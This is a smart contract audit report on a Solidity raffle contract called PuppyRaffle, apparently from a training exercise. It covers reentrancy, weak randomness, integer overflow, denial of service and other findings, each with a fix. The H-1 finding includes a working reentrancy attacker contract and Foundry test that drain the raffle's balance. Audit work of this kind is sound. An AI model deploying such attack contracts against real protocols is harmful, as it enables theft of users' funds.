### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance


**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that call do we update the `PuppyRaffle::players` array.

```js
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

->  payable(msg.sender).sendValue(entranceFee);
->  players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

**Impact:** 
All fees paid by raffle entrants could be stolen by a malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the PuppyRaffle balance.

<summary>PoC</summary>


Add the following to `PuppyRaffle.t.sol`

```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

// test to confirm vulnerability
function testCanGetRefundReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

    // attack

    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();

    // impact
    console.log("attackerContract balance: ", startingAttackContractBalance);
    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
    console.log("ending attackerContract balance: ", address(attackerContract).balance);
    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
}
```

</details>

**Recommendation:** 
To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally we should move the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
  address playerAddress = players[playerIndex];
  require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
  require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+ players[playerIndex] = address(0);
+   emit RaffleRefunded(playerAddress);
  payable(msg.sender).sendValue(entranceFees);
- players[playerIndex] = address(0);
- emit RaffleRefunded(playerAddress);
  }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner

**Description:** 
Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves. 

**Impact:** 
Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy. 

**Proof of Concept:** 

There are a few attack vectors here. 

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
2. Users can manipulate the `msg.sender` value to result in their index being the winner.

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** 
Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).




### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** 
In solidity versions prior to `0.8.0` integers were subject to integer overflows.

```js
    uint64 myVar = type(uint64).max
    // 18446744073709551615
    myVar = myVar + 1
    // myVar will be 0
```

**Impact:** 
In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract

**Proof of Concept:**

<details>
<summary>Integer Overflow PoC</summary>

1. We conclude a raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle
3. `totalFees` will be:

```js
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```

4. You will not be able to withdraw due to the line in `PuppyRaffle::withdrawFees`:

```js
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not the intended desing of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to hit.


<details>
<summary>Code</summary>

```js
function testTotalFeesOverflow() public playersEntered {
    // We finish a raffle of 4 to collect some fees
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();
    uint256 startingTotalFees = puppyRaffle.totalFees();
    // startingTotalFees = 800000000000000000

    // We then have 89 players enter a new raffle
    uint256 playersNum = 89;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    // We end the raffle
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    // And here is where the issue occurs
    // We will now have fewer fees even though we just finished a second raffle
    puppyRaffle.selectWinner();

    uint256 endingTotalFees = puppyRaffle.totalFees();
    console.log("ending total fees", endingTotalFees);
    assert(endingTotalFees < startingTotalFees);

    // We are also unable to withdraw any fees because of the require check
    vm.prank(puppyRaffle.feeAddress());
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```

</details>

</details>

**Recommended Mitigation:** 

There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.
    ```diff
    - pragma solidity ^0.7.6;
    + pragma solidity ^0.8.18;
    ```
Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

1. Use a `uint256` instead of a `uint64` for `totalFees`.
    ```diff
    - uint64 public totalFees = 0;
    + uint256 public totalFees = 0;
    ```
2. Remove the balance check in `PuppyRaffle::withdrawFees`
    ```diff
    - require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ```
We additionally want to bring your attention to another attack vector as a result of this line in a future finding.

### [M-1] Denial of Service on `PuppyRaffle::enterRaffle`, as the looping through array to check for duplicates will increment gas costs for future entrants

**Description:** 
The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

```js

-> for(uint256 i = 0; i < players.length -1; i++){
    for(uint256 j = i+1; j< players.length; j++){
    require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
  }
}

```

**Impact:** 
The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.

An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**
We can see on the first 10 players, that the gas fee is growing rapidly as such:

  gas spend by player 0 is 59526
  gas spend by player 1 is 34284
  gas spend by player 2 is 36276
  gas spend by player 3 is 39103
  gas spend by player 4 is 42762
  gas spend by player 5 is 47256
  gas spend by player 6 is 52585
  gas spend by player 7 is 58746
  gas spend by player 8 is 65743
  gas spend by player 9 is 73572

 
This can be checked with the following test (additional users can be added):

<details>
<summary>PoC</summary>

  ```js
    function testGasFeePerPlayer() public {
        address[] memory players = new address[](10);
        address[] memory singlePlayer = new address[](1);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        players[4] = address(5);
        players[5] = address(6);
        players[6] = address(7);
        players[7] = address(8);
        players[8] = address(9);
        players[9] = address(10);

        for (uint256 i = 0; i < players.length; i++) {
            singlePlayer[0] = players[i];
            vm.deal(players[i], entranceFee);

            vm.startPrank(players[i]);
            uint256 gasBefore = gasleft();

            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);

            uint256 gasUsed = gasBefore - gasleft();
            vm.stopPrank();
            console2.log("gas spend by player", i, "is", gasUsed);
        }
    }
  ```
</details>

**Recommended Mitigation:** 
1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

**Description:** 
The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check. 

```javascript
    function withdrawFees() external {
->      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

**Impact:** 
This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees. 

**Proof of Concept:**

1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
2. Malicious user sends 1 wei via a `selfdestruct`
3. `feeAddress` is no longer able to withdraw funds

**Recommended Mitigation:** 
Remove the balance check on the `PuppyRaffle::withdrawFees` function. 

```diff
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** 
In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
->      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

**Impact:** 
This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```js
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** 
Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```js
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists.

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** 
The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** 
The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:**
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** 
There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owners on the winner to claim their prize. (Recommended)

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and players at index 0 causing players to incorrectly think they have not entered the raffle

**Description:** 
If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec it will also return zero if the player is NOT in the array.


```js
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** 
A player at index 0 may incorrectly think they have not entered the raffle and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation

**Recommendations:** 
The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but an even better solution might be to return an `int256` where the function returns -1 if the player is not active.

# Info

### [I-1] Solidity pragma should be specific, not wide

**Description:** 
Consider using a specific version of Solidity in your contracts instead of a wide version.
For example, instead of `pragma solidity ^0.8.0;` use `pragma solidity 0.8.0;`

### [I-2] Using an Outdated Version of Solidity is Not Recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.
Recommendation

**Recommendations:**

Deploy with any of the following Solidity versions:

    0.8.18

The recommendations take into account:

    Risks related to recent releases
    Risks of complex code generation changes
    Risks of new language features
    Risks of known bugs

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)

  ```solidity
          feeAddress = _feeAddress;
  ```

- Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)

  ```solidity
          previousWinner = winner;
  ```

- Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)

  ```solidity
          feeAddress = newFeeAddress;
  ```

### [I-4] does not follow CEI, which is not a best practice

It's best to keep code clean and follow CEI (Checks, Effects, Interactions).

```diff
-   (bool success,) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+   (bool success,) = winner.call{value: prizePool}("");
+   require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.

Examples:

```js
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PRECISION = 100;

    uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
    uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;
```

### [I-6] Test Coverage 

**Description:** 
The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.

```
| File                               | % Lines        | % Statements   | % Branches     | % Funcs       |
| ---------------------------------- | -------------- | -------------- | -------------- | ------------- |
| script/DeployPuppyRaffle.sol       | 0.00% (0/3)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |
| src/PuppyRaffle.sol                | 82.46% (47/57) | 83.75% (67/80) | 66.67% (20/30) | 77.78% (7/9)  |
| test/auditTests/ProofOfCodes.t.sol | 100.00% (7/7)  | 100.00% (8/8)  | 50.00% (1/2)   | 100.00% (2/2) |
| Total                              | 80.60% (54/67) | 81.52% (75/92) | 65.62% (21/32) | 75.00% (9/12) |
```

**Recommended Mitigation:** 
Increase test coverage to 90% or higher, especially for the `Branches` column. 

### [I-7] State Changes are Missing Events

A lack of emitted events can often lead to difficulty of external or front-end systems to accurately track changes within a protocol.

It is best practice to emit an event whenever an action results in a state change.

Examples:
- `PuppyRaffle::totalFees` within the `selectWinner` function
- `PuppyRaffle::raffleStartTime` within the `selectWinner` function
- `PuppyRaffle::totalFees` within the `withdrawFees` function

### [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading a constant or immutable variable.

Instances:

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`


### [G-2] Storage Variables in a Loop Should be Cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

```diff
+ uint256 playersLength = players.length;
- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < playersLength - 1; i++) {
-    for (uint256 j = i + 1; j < players.length; j++) {
+    for (uint256 j = i + 1; j < playersLength; j++) {
      require(players[i] != players[j], "PuppyRaffle: Duplicate player");
}
}
```
